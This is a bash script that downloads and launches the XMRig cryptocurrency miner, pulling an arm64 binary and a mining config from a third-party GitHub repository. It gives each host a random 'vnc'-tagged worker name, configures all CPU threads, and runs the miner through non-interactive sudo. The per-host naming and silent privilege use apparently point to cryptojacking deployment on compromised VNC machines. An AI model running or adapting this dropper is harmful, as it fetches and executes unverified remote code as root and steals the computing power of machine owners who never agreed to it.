#!/bin/bash

if [ -d /tmp ]; then
    echo "/tmp exists"
else
    # create tmp if it doesn't exist (yes that happened...)
    sudo -n mkdir /tmp
    sudo -n chmod 777 /tmp
fi

# try to install wget
sudo -n apt update
sudo -n apt install -y wget
sudo -n apk add wget
sudo -n dnf install wget

if command -v wget >/dev/null 2>&1; then
    DOWNLOAD_CMD="wget"
else
    DOWNLOAD_CMD="curl -O"
fi

# arm64 check
arch=$(uname -m)
is_arm64=false

if [ "$arch" == "aarch64" ]; then
    is_arm64=true
fi

# use curl because it's present on more distributions
$DOWNLOAD_CMD https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz
tar -xf xmrig-6.21.3-linux-static-x64.tar.gz
cd xmrig-6.21.3

# replace xmrig file if system is arm64
if $is_arm64; then
    rm -rf xmrig
    $DOWNLOAD_CMD https://github.com/spetterman66/verynicerepo/raw/main/xmrig
fi

# just to be extra safe
chmod +x xmrig

rm -rf config.json
$DOWNLOAD_CMD https://raw.githubusercontent.com/spetterman66/verynicerepo/main/config.json
randnum=$(( RANDOM % 1000 + 1 ))
sed -i "s/17lifers@home/17lifers-vnc-$randnum/g" config.json

sudo -n apk add util-linux
sudo -n apt install -y util-linux
sudo -n dnf install util-linux
num_threads=$(lscpu | grep "^CPU(s):" | awk '{print $2}')

# generate the replacement string with -1 repeated num_threads times, separated by commas
replacement_string=$(yes -1 | head -n $num_threads | paste -sd, -)
replacement_string=${replacement_string%, }  # remove the trailing comma and space

sed -i "s/THREADSTRINGTOREPLACE/$replacement_string/g" config.json

sudo -n ./xmrig
./xmrig
